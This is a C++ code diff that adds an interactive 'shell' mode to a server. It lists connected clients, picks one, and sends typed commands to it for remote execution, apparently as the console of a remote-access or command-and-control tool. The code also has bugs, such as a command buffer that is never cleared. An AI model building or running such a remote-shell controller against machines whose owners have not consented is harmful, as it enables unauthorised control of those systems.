@@ -184,5 +184,44 @@ int32_t main(int32_t argc, char **argv) {
 
             std::cout << "Message delivered" << "\n\tFails: " << failed << std::endl;
         }
+
+        if (sh == "shell") {
+            uint32_t CID = 0;
+
+            int count = 0;
+
+            for (const auto& CID_id : server.getCID()) {
+                std::cout << count << ". " << CID_id.data() << std::endl;
+
+                ++count;
+            }
+
+            std::cout << "CID> ";
+            std::cin >> CID;
+
+            if (CID >= server.getCID().size() || CID < 0)
+                std::cout << "Invalid CID" << std::endl;
+
+            else {
+                std::string data;
+                std::string shell;
+
+                while (true) {
+                    std::cout << "user-" << server.getCID().at(CID).data() << "> ";
+                    std::cin >> data;
+
+                    shell.push_back(SHELL_MODE_BYTE);
+                    shell += data;
+
+                    if (!server.sendBy(server.getCID().at(CID), shell))
+                        std::cout << "Send error" << std::endl;
+
+                    else
+                        std::cout << "Command sended" << std::endl;
+
+                    std::cout << server.readClientData(server.getCID().at(CID)) << std::endl;
+                }
+            }
+        }
     }
 }
